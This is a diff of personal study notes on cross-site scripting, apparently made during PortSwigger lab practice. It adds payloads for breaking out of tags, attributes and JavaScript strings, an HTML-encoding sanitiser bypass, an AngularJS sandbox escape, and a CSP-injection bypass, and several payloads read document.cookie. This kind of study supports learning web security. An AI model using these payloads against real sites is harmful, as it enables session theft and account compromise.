@@ -128,19 +128,55 @@ anular.element(document.getElementById('<ID>')).scope()
 
 ### XSS Payloads
 
+> If the spaces cause errors, remove them.
+> Sometimes double qoutes dont work, replace them with single qoutes.
+> To break out of a string, use the `\"` to insert a qoute. If that doesn't work, try `</script>` and then insert the payload.
 ```
 mins"> <svg onload=alert(1)>     //closing off a tag and adding a new one.
-" onfocus=alert() autofocus x="  //closing off an attribute and adding a new one and closing off the rest.
+
+" onfocus=alert() autofocus x="  //closing off an attribute and adding a new one and 
+closing off the rest.
+
 minso> </select> <svg onload=alert()>
+
 <img src=1 onerror=alert(1)>
+
 href = javascript:alert(document.cookie)
-{{ $new.constructor('alert()') () }}
+
+{{ $new.constructor('alert()') () }}  //angular
+
+</script><img src=1 onerror=alert(document.domain)>  //breaking out of the script and adding our own code.
+
+</script><script>alert()</script>     //same as above but adding a new script tag.
+
 <iframe src ="https://0a0b00b9043b4ccf8331690900400055.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
+
+onerror=alert; throw,1       // when brackets are encoded and cannot be used.
 
 //if no tags are allowed use the script technique with the location attribute
 <script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search= <mins id=omar onfocus=alert(document.cookie)> #omar"; </script>
 ```
 > This last one creates a custom tag `mins`, and adds the attribute `onfocus` and then focuses on it using the `#omar` at the end using its id, triggering the event. Can use the `autofocus` attribute as well.
+
+
+##### Breaking out of a JavaScript string
+```
+'-alert(document.domain)-' 
+';alert(document.domain)//
+```
+> If they don't work, try adding `\` in the beginning to escape out of the string the single qoute.
+
+
+##### Using HTML- [[Web Encoding]]
+
+> Using HTML encoding to bypass sanitization checks.
+> The browser can decode the encoded attack while interpreting the JavaScript, so the attack succeeds.
+```
+&apos;-alert(document.domain)-&apos;
+```
+> The apostrophe gets sanitized, so inputting encoded passes these checks, and then the browser decodes it while interpreting the javascript.
+> Find the list of codes [here](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references).
+> Can also use the hex version encoding, or numbers.
 
 ##### `<svg>`
 
@@ -154,6 +190,20 @@ href = javascript:alert(document.cookie)
 </a> </svg>
 ```
 
+##### JavaScript String Literals
+
+> Similar to Angular [[String Interpolation]], where there is javascript executed inside html between the ` `` ` backticks.
+> If the XSS input is there, we can put the payload between `${ <code> }` .
+```
+${alert(1)}
+```
+
+##### Canonical Tags in XSS
+
+> Some events aren't fired automatically.
+> They use the `accesskey` attribute that defines a letter.
+> If this letter is pressed with a combination of other keys, the assigned event is triggered.
+
 ##### Finding the Right Tag and Event Attribute Using [[Burp Suite]]
 
 > Head to the [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
@@ -164,10 +214,56 @@ href = javascript:alert(document.cookie)
 
 ---
 
+### Client Side Template Injection
+
+> These vulnerabilities arise when client side frameworks dynamically embed user input into the webpages.
+> These frameworks scan the template and executes any expressions that it can.
+> These can be exploited via XSS.
+
+> Using `.charAt=[].join` causes the function to return all characters sent to it.
+> If there are no strings allowed, by preventing qoutes and double qoutes, we can use `String.fromCharCode()`.
+> We don't have access to `String`, so we need to use `fromCharCode()` from an actual string variable, or creating a string.
+> Use `$eval()` to create strings, or the `[1]|orderBy:'String'` function.
+> This String in the end can be created using `fromCharCode()`.
+
+>An example payload would be.
+```
+toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+>The first line creates an empty string `''` and escapes from the Angular sandbox.
+>The second line uses that string to create a string given its ASCII codes in order.
+>Those ASCII codes translate to `x=alert(1)`.
+
+---
+
 ### [[Cookies]] Stealing With XSS
 
 > JavaScript can only access [[Cookies]] if the `HttpOnly` flag is disabled. 
 > Cookies can be displayed with `<script>alert(document.cookie)</script>`.
+
+---
+
+### Content Security Policy (CSP)
+
+> Browser mechanism to mitigate XSS via the [[HTTP]] response header `Content-Security-Policy`.
+> The values of that header are directives separated by semicolons.
+> NOT IN FIREFOX.
+
+* `script-src 'self'` : allows only scripts loaded from the same origin page. [[Same Origin Policy (SOP)]].
+* `script-src https://scripts.normal-website.com` : Allows scripts from a specific domain.
+
+> If these headers are input controlled, they can be attacked.
+> Found in a `report-uri` directive, the last one in the list.
+> A semicolon can be added, and our own policies can be added.
+
+> Chrome introduced the `script-src-elem` directive that can be used to control `script` elements.
+> This can be used to overwrite existing `script-src` elements.
+> Open the console while playing with this to see the results.
+
+```
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+```
+> Added the `unsafe-inline` directive value that takes any script.
 
 ---
 
